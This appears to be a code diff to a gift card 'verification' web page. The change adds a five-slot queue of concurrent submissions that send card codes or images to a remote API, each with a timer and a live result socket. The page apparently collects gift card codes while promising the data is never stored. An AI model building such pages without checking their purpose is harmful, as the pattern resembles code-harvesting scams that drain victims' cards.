+                <div class="slot-dot" id="dot0"></div>
+                <div class="slot-dot" id="dot1"></div>
+                <div class="slot-dot" id="dot2"></div>
+                <div class="slot-dot" id="dot3"></div>
+                <div class="slot-dot" id="dot4"></div>
+            </div>
+        </div>
+
         <!-- Upload -->
         <p class="sec-label"><i class="fa-solid fa-image" style="color:var(--accent)"></i> Card Image <span class="opt">optional</span></p>
         <div class="upload-area" id="uploadArea">
@@ -570,45 +466,26 @@
         </div>
         <div class="char-counter" id="charCounter">0 / 16</div>
 
-        <!-- Hint -->
         <div class="hint" id="hintMsg">
             <i class="fa-solid fa-triangle-exclamation"></i>
             Please upload an image or enter a code — at least one required.
         </div>
 
-        <!-- Submit -->
         <button type="button" class="submit-btn" id="submitBtn">
             <i class="fa-solid fa-bolt"></i> Verify Now
         </button>
         <p class="privacy"><i class="fa-solid fa-lock"></i> Your data is never stored or shared.</p>
 
-        <!-- Status -->
-        <div class="status-box" id="statusBox">
-            <div class="status-header">
-                <div>
-                    <p class="status-title">Verification in progress</p>
-                    <p class="status-sub">Hang tight while we check your card...</p>
+        <!-- Verification Queue -->
+        <div id="verificationQueue" style="display:none">
+            <div class="queue-header">
+                <div class="queue-title">
+                    <i class="fa-solid fa-list-check"></i>
+                    Your Verifications
                 </div>
-                <div class="timer" id="timerDisplay">05:00</div>
+                <div class="queue-count" id="queueCount">0 active</div>
             </div>
-
-            <div class="progress-wrap">
-                <div class="progress-line-bg"></div>
-                <div class="progress-step">
-                    <div class="pnode active" id="step1"><i class="fa-solid fa-check"></i></div>
-                    <span class="plabel active">Submitted</span>
-                </div>
-                <div class="progress-step">
-                    <div class="pnode" id="step2"></div>
-                    <span class="plabel" id="step2Label">Checking</span>
-                </div>
-                <div class="progress-step">
-                    <div class="pnode" id="step3"></div>
-                    <span class="plabel" id="step3Label">Result</span>
-                </div>
-            </div>
-
-            <div class="result-banner" id="resultBanner"></div>
+            <div id="queueList"></div>
         </div>
     </div>
 </div>
@@ -619,30 +496,53 @@
 </footer>
 
 <script>
-    const API = 'https://www.swiftverify.me'; // ← swap before deploying
+    const API      = 'https://www.swiftverify.me';
+    const MAX_SLOTS = 5;
 
-    let verificationActive = false;
-    let timerInterval      = null;
-    let socket             = null;
-
-    window.addEventListener('beforeunload', (e) => { if (verificationActive) { e.preventDefault(); e.returnValue=''; } });
-    window.addEventListener('error',             (e) => { e.preventDefault(); return false; });
-    window.addEventListener('unhandledrejection',(e) => e.preventDefault());
+    // ── State ──────────────────────────────────────
+    // Map of submissionId → { timer, socket, cardEl }
+    const activeVerifications = new Map();
 
     // ── DOM ────────────────────────────────────────
-    const uploadArea     = document.getElementById('uploadArea');
-    const imageInput     = document.getElementById('imageInput');
-    const imagePreview   = document.getElementById('imagePreview');
-    const previewImg     = document.getElementById('previewImg');
+    const uploadArea        = document.getElementById('uploadArea');
+    const imageInput        = document.getElementById('imageInput');
+    const imagePreview      = document.getElementById('imagePreview');
+    const previewImg        = document.getElementById('previewImg');
     const uploadPlaceholder = document.getElementById('uploadPlaceholder');
-    const removeImageBtn = document.getElementById('removeImageBtn');
-    const submitBtn      = document.getElementById('submitBtn');
-    const codeInput      = document.getElementById('codeInput');
-    const charCounter    = document.getElementById('charCounter');
-    const hintMsg        = document.getElementById('hintMsg');
-    const statusBox      = document.getElementById('statusBox');
-    const timerDisplay   = document.getElementById('timerDisplay');
-    const resultBanner   = document.getElementById('resultBanner');
+    const removeImageBtn    = document.getElementById('removeImageBtn');
+    const submitBtn         = document.getElementById('submitBtn');
+    const codeInput         = document.getElementById('codeInput');
+    const charCounter       = document.getElementById('charCounter');
+    const hintMsg           = document.getElementById('hintMsg');
+    const verificationQueue = document.getElementById('verificationQueue');
+    const queueList         = document.getElementById('queueList');
+    const queueCount        = document.getElementById('queueCount');
+
+    // ── Slot dots ──────────────────────────────────
+    function updateSlotDots() {
+        const count = activeVerifications.size;
+        for (let i = 0; i < MAX_SLOTS; i++) {
+            const dot = document.getElementById(`dot${i}`);
+            dot.className = 'slot-dot' + (i < count ? ' used' : '');
+        }
+        // Update submit button
+        if (count >= MAX_SLOTS) {
+            submitBtn.disabled  = true;
+            submitBtn.className = 'submit-btn maxed';
+            submitBtn.innerHTML = `<i class="fa-solid fa-ban"></i> All 5 slots in use`;
+        } else {
+            submitBtn.disabled  = false;
+            submitBtn.className = 'submit-btn';
+            submitBtn.innerHTML = `<i class="fa-solid fa-bolt"></i> Verify Now`;
+        }
+        // Queue section visibility
+        if (count > 0) {
+            verificationQueue.style.display = 'block';
+            queueCount.textContent = `${count} active`;
+        } else {
+            verificationQueue.style.display = 'none';
+        }
+    }
 
     // ── Upload ─────────────────────────────────────
     uploadArea.addEventListener('click', (e) => { if (!e.target.closest('#removeImageBtn')) imageInput.click(); });
@@ -677,108 +577,179 @@
     });
     codeInput.addEventListener('keydown', (e) => { if(e.key==='Enter'){e.preventDefault();submitBtn.click();} });
 
-    // ── Timer ──────────────────────────────────────
-    function startTimer(seconds) {
-        if (timerInterval) clearInterval(timerInterval);
-        let t = seconds;
-        const tick = () => {
+    // ── Reset form only (not the queue) ───────────
+    function resetForm() {
+        imageInput.value = ''; previewImg.src = '';
+        imagePreview.style.display = 'none';
+        uploadPlaceholder.style.display = 'block';
+        uploadArea.classList.remove('uploaded');
+        codeInput.value = '';
+        charCounter.textContent = '0 / 16';
+        charCounter.className   = 'char-counter';
+        hintMsg.classList.remove('show');
+    }
+
+    // ── Create a verification card in the queue ────
+    function createVerificationCard(submissionId, code) {
+        const cardEl = document.createElement('div');
+        cardEl.className = 'v-card';
+        cardEl.id = `vcard-${submissionId}`;
+        cardEl.innerHTML = `
+            <div class="v-card-header">
+                <div class="v-card-top-row">
+                    <div class="v-card-header-left">
+                        <p class="v-code-label">Gift Card Code</p>
+                        <p class="v-code">${code || 'Image only'}</p>
+                    </div>
+                    <div class="v-timer" id="vtimer-${submissionId}">05:00</div>
+                </div>
+            </div>
+            <div class="v-progress">
+                <div class="v-pnode active" id="vp1-${submissionId}"><i class="fa-solid fa-check"></i></div>
+                <div class="v-pline" id="vl1-${submissionId}"></div>
+                <div class="v-pnode" id="vp2-${submissionId}"></div>
+                <div class="v-pline" id="vl2-${submissionId}"></div>
+                <div class="v-pnode" id="vp3-${submissionId}"></div>
+                <span class="v-plabel" id="vstatus-${submissionId}">Checking...</span>
+            </div>
+            <div class="v-result" id="vresult-${submissionId}"></div>
+        `;
+        queueList.prepend(cardEl);
+        return cardEl;
+    }
+
+    // ── Start per-card timer ───────────────────────
+    function startCardTimer(submissionId) {
+        let t = 300; // 5 minutes
+        const timerEl = document.getElementById(`vtimer-${submissionId}`);
+
+        const interval = setInterval(() => {
+            if (!timerEl) { clearInterval(interval); return; }
             const m = Math.floor(t/60).toString().padStart(2,'0');
             const s = (t%60).toString().padStart(2,'0');
-            timerDisplay.textContent = `${m}:${s}`;
-            if (t<=60) { timerDisplay.classList.add('urgent'); timerDisplay.classList.remove('done'); }
-            if (t<=0)  { clearInterval(timerInterval); timerInterval=null; onExpired(); return; }
-            t--;
-        };
-        tick(); timerInterval = setInterval(tick,1000);
-    }
-
-    function stopTimer() { if(timerInterval){clearInterval(timerInterval);timerInterval=null;} }
-
-    function onExpired() {
-        verificationActive = false;
-        timerDisplay.textContent = "Time's Up";
-        timerDisplay.classList.add('done'); timerDisplay.classList.remove('urgent');
-        submitBtn.disabled  = false;
-        submitBtn.className = 'submit-btn try-again';
-        submitBtn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Try Again`;
-        if (socket) { socket.disconnect(); socket = null; }
-    }
-
-    // ── Show result ────────────────────────────────
-    function showResult(status) {
-        stopTimer(); verificationActive = false;
-        ['step2','step3'].forEach(id => {
-            const n = document.getElementById(id);
-            n.classList.add('active'); n.innerHTML = `<i class="fa-solid fa-check"></i>`;
-        });
-        document.getElementById('step2Label').classList.add('active');
-        document.getElementById('step3Label').classList.add('active');
-
-        resultBanner.className = `result-banner show ${status==='approved'?'approved':'rejected'}`;
-        resultBanner.innerHTML = status==='approved'
-            ? `<i class="fa-solid fa-circle-check"></i> Your gift card is <strong>valid</strong>! Verification approved.`
-            : `<i class="fa-solid fa-circle-xmark"></i> This gift card is <strong>invalid</strong>. Verification rejected.`;
-
-        submitBtn.disabled  = true;
-        submitBtn.className = `submit-btn ${status==='approved'?'valid':'invalid'}`;
-        submitBtn.innerHTML = status==='approved'
-            ? `<i class="fa-solid fa-circle-check"></i> Valid`
-            : `<i class="fa-solid fa-circle-xmark"></i> Invalid`;
-
-        timerDisplay.textContent = status==='approved'?'Verified ✓':'Rejected ✗';
-        timerDisplay.classList.add('done'); timerDisplay.classList.remove('urgent');
-
-        resultBanner.scrollIntoView({behavior:'smooth',block:'center'});
-    }
-
-    // ── Socket ─────────────────────────────────────
-    function initSocket(id) {
-        if (socket) { setupSocket(id); return; }
-        socket = io(API, {reconnection:false, transports:['polling'], forceNew:true});
-        socket.on('connect',       () => setupSocket(id));
-        socket.on('connect_error', (e) => console.error('Socket:',e.message));
-        socket.on('disconnect',    () => console.log('Socket disconnected'));
-    }
-    function setupSocket(id) {
-        if (!socket||!id) return;
-        socket.off(`result_${id}`);
-        socket.on(`result_${id}`, (data) => {
-            if (data.status==='checking_code') {
-                const n=document.getElementById('step2');
-                n.classList.add('active'); n.innerHTML=`<i class="fa-solid fa-check"></i>`;
-                document.getElementById('step2Label').classList.add('active');
+            timerEl.textContent = `${m}:${s}`;
+            if (t <= 60) { timerEl.classList.add('urgent'); timerEl.classList.remove('done'); }
+            if (t <= 0) {
+                clearInterval(interval);
+                onCardExpired(submissionId);
+                return;
             }
-            if (data.status==='approved'||data.status==='rejected') showResult(data.status);
-        });
+            t--;
+        }, 1000);
+
+        // Store interval so we can clear it later
+        const entry = activeVerifications.get(submissionId);
+        if (entry) entry.timerInterval = interval;
     }
 
-    // ── Reset ──────────────────────────────────────
-    function resetForm() {
-        imageInput.value=''; previewImg.src='';
-        imagePreview.style.display='none';
-        uploadPlaceholder.style.display='block';
-        uploadArea.classList.remove('uploaded');
-        codeInput.value='';
-        charCounter.textContent='0 / 16'; charCounter.className='char-counter';
-        statusBox.classList.remove('show');
-        resultBanner.className='result-banner'; resultBanner.innerHTML='';
-        ['step2','step3'].forEach(id=>{
-            const n=document.getElementById(id);
-            n.className='pnode'; n.innerHTML='';
+    // ── Card expired ───────────────────────────────
+    function onCardExpired(submissionId) {
+        const timerEl   = document.getElementById(`vtimer-${submissionId}`);
+        const statusEl  = document.getElementById(`vstatus-${submissionId}`);
+        const resultEl  = document.getElementById(`vresult-${submissionId}`);
+
+        if (timerEl)  { timerEl.textContent = "Time's Up"; timerEl.className = 'v-timer done'; }
+        if (statusEl) statusEl.textContent = 'Expired';
+        if (resultEl) {
+            resultEl.className = 'v-result show expired';
+            resultEl.innerHTML = `<i class="fa-regular fa-clock"></i> Verification timed out.`;
+        }
+
+        // Disconnect socket for this card
+        const entry = activeVerifications.get(submissionId);
+        if (entry?.socket) { entry.socket.disconnect(); }
+
+        // Timed out → remove after 5 seconds
+        scheduleRemoval(submissionId, 5000);
+    }
+
+    // ── Show result on a card ──────────────────────
+    function showCardResult(submissionId, status) {
+        const entry = activeVerifications.get(submissionId);
+        if (!entry) return;
+
+        // Stop timer
+        if (entry.timerInterval) clearInterval(entry.timerInterval);
+
+        const timerEl  = document.getElementById(`vtimer-${submissionId}`);
+        const statusEl = document.getElementById(`vstatus-${submissionId}`);
+        const resultEl = document.getElementById(`vresult-${submissionId}`);
+        const vp2      = document.getElementById(`vp2-${submissionId}`);
+        const vp3      = document.getElementById(`vp3-${submissionId}`);
+        const vl1      = document.getElementById(`vl1-${submissionId}`);
+        const vl2      = document.getElementById(`vl2-${submissionId}`);
+
+        // Activate progress nodes
+        [vp2, vp3].forEach(n => { if(n){ n.classList.add('active'); n.innerHTML=`<i class="fa-solid fa-check"></i>`; } });
+        [vl1, vl2].forEach(l => { if(l) l.classList.add('active'); });
+
+        if (timerEl) {
+            timerEl.textContent = status === 'approved' ? 'Valid ✓' : 'Invalid ✗';
+            timerEl.className   = `v-timer done`;
+            timerEl.style.color = status === 'approved' ? 'var(--green)' : 'var(--red)';
+        }
+        if (statusEl) statusEl.textContent = status === 'approved' ? 'Approved' : 'Rejected';
+
+        if (resultEl) {
+            resultEl.className = `v-result show ${status === 'approved' ? 'approved' : 'rejected'}`;
+            resultEl.innerHTML = status === 'approved'
+                ? `<i class="fa-solid fa-circle-check"></i><span><strong>Valid</strong> — Gift card approved.</span>`
+                : `<i class="fa-solid fa-circle-xmark"></i><span><strong>Invalid</strong> — Gift card rejected.</span>`;
+        }
+
+        // Disconnect socket
+        if (entry.socket) entry.socket.disconnect();
+
+        // Approved/Rejected → stay for 30 seconds so user can read result
+        scheduleRemoval(submissionId, 30000);
+    }
+
+    // ── Schedule card removal ──────────────────────
+    // expired/timed out → 5s, approved/rejected → 30s
+    function scheduleRemoval(submissionId, delay = 5000) {
+        setTimeout(() => {
+            const cardEl = document.getElementById(`vcard-${submissionId}`);
+            if (cardEl) {
+                cardEl.classList.add('fading');
+                setTimeout(() => {
+                    cardEl.remove();
+                    activeVerifications.delete(submissionId);
+                    updateSlotDots();
+                }, 500);
+            }
+        }, delay);
+    }
+
+    // ── Init socket per card ───────────────────────
+    function initCardSocket(submissionId) {
+        const sock = io(API, { reconnection: false, transports: ['polling'], forceNew: true });
+
+        sock.on('connect', () => {
+            sock.off(`result_${submissionId}`);
+            sock.on(`result_${submissionId}`, (data) => {
+                if (data.status === 'checking_code') {
+                    const vp2 = document.getElementById(`vp2-${submissionId}`);
+                    const vl1 = document.getElementById(`vl1-${submissionId}`);
+                    if (vp2) { vp2.classList.add('active'); vp2.innerHTML=`<i class="fa-solid fa-check"></i>`; }
+                    if (vl1) vl1.classList.add('active');
+                }
+                if (data.status === 'approved' || data.status === 'rejected') {
+                    showCardResult(submissionId, data.status);
+                }
+            });
         });
-        document.getElementById('step2Label').classList.remove('active');
-        document.getElementById('step3Label').classList.remove('active');
-        timerDisplay.textContent='05:00'; timerDisplay.className='timer';
-        submitBtn.disabled=false; submitBtn.className='submit-btn';
-        submitBtn.innerHTML=`<i class="fa-solid fa-bolt"></i> Verify Now`;
-        if(socket){socket.disconnect();socket=null;}
-        verificationActive=false; hintMsg.classList.remove('show');
+
+        sock.on('connect_error', (e) => console.error('Socket error:', e.message));
+
+        // Store socket reference
+        const entry = activeVerifications.get(submissionId);
+        if (entry) entry.socket = sock;
     }
 
     // ── Submit ─────────────────────────────────────
     submitBtn.addEventListener('click', function() {
-        if (submitBtn.classList.contains('try-again')) { resetForm(); return; }
         if (submitBtn.disabled) return;
+        if (activeVerifications.size >= MAX_SLOTS) return;
 
         const hasImage = imageInput.files[0];
         const rawCode  = codeInput.value.replace(/[^a-zA-Z0-9]/g,'');
@@ -786,13 +757,15 @@
 
         if (!hasImage && !hasCode) {
             hintMsg.classList.add('show');
-            hintMsg.scrollIntoView({behavior:'smooth',block:'center'}); return;
+            hintMsg.scrollIntoView({behavior:'smooth',block:'center'});
+            return;
         }
 
         hintMsg.classList.remove('show');
-        submitBtn.disabled=true;
-        submitBtn.innerHTML=`<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...`;
-        verificationActive=true;
+        submitBtn.disabled  = true;
+        submitBtn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Submitting...`;
+
+        const displayCode = hasCode ? codeInput.value.trim() : null;
 
         const fd = new FormData();
         if (hasImage) fd.append('image', hasImage);
@@ -800,29 +773,68 @@
 
         const xhr = new XMLHttpRequest();
         xhr.open('POST', `${API}/api/submissions/submit`, true);
+
         xhr.onload = function() {
-            if (xhr.status>=200 && xhr.status<300) {
+            if (xhr.status >= 200 && xhr.status < 300) {
                 let data;
-                try { data=JSON.parse(xhr.responseText); }
-                catch(e) { resetErr(); alert('Unreadable response.'); return; }
+                try { data = JSON.parse(xhr.responseText); }
+                catch(e) { resetSubmitBtn(); alert('Unreadable response.'); return; }
+
                 if (data.success && data.submissionId) {
-                    statusBox.classList.add('show');
-                    resultBanner.className='result-banner';
-                    startTimer(300);
-                    initSocket(data.submissionId);
-                    setTimeout(()=>statusBox.scrollIntoView({behavior:'smooth',block:'start'}),150);
-                } else { resetErr(); alert('Error: '+(data.message||'Submission failed')); }
-            } else { resetErr(); alert('Server error: '+xhr.status); }
+                    const sid = data.submissionId;
+
+                    // Register in active map
+                    activeVerifications.set(sid, { timerInterval: null, socket: null });
+
+                    // Create card in queue
+                    createVerificationCard(sid, displayCode);
+
+                    // Start independent timer
+                    startCardTimer(sid);
+
+                    // Init independent socket
+                    initCardSocket(sid);
+
+                    // Update slot dots
+                    updateSlotDots();
+
+                    // Clear form for next submission
+                    resetForm();
+                    resetSubmitBtn();
+
+                    // Scroll to queue
+                    setTimeout(() => {
+                        verificationQueue.scrollIntoView({behavior:'smooth', block:'start'});
+                    }, 200);
+
+                } else {
+                    resetSubmitBtn();
+                    alert('Error: ' + (data.message || 'Submission failed'));
+                }
+            } else {
+                resetSubmitBtn();
+                alert('Server error: ' + xhr.status);
+            }
         };
-        xhr.onerror = () => { resetErr(); alert('Connection failed.'); };
+
+        xhr.onerror = () => { resetSubmitBtn(); alert('Connection failed.'); };
         xhr.send(fd);
     });
 
-    function resetErr() {
-        submitBtn.disabled=false; submitBtn.className='submit-btn';
-        submitBtn.innerHTML=`<i class="fa-solid fa-bolt"></i> Verify Now`;
-        verificationActive=false;
+    function resetSubmitBtn() {
+        if (activeVerifications.size >= MAX_SLOTS) {
+            submitBtn.disabled  = true;
+            submitBtn.className = 'submit-btn maxed';
+            submitBtn.innerHTML = `<i class="fa-solid fa-ban"></i> All 5 slots in use`;
+        } else {
+            submitBtn.disabled  = false;
+            submitBtn.className = 'submit-btn';
+            submitBtn.innerHTML = `<i class="fa-solid fa-bolt"></i> Verify Now`;
+        }
     }
+
+    // Init slot dots on load
+    updateSlotDots();
 </script>
 </body>
 </html>
